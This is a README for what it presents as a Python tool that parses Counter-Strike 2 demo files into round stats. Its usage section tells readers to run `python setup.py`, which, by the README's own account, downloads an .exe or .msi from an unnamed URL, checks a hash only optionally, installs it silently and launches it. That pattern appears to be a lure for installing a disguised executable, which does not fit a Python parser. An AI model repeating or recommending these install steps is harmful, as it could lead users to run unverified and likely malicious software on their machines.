> CS2 Demo Parser is a Python tool that reads Counter-Strike 2 .dem files and outputs round-by-round stats.

## Features

- Round-by-round stats (kills, utility, economy)
- Per-player heatmap of positions
- Export to JSON / CSV
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/cs2-demo-parser-turbo-60.git
cd cs2-demo-parser-turbo-60
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.
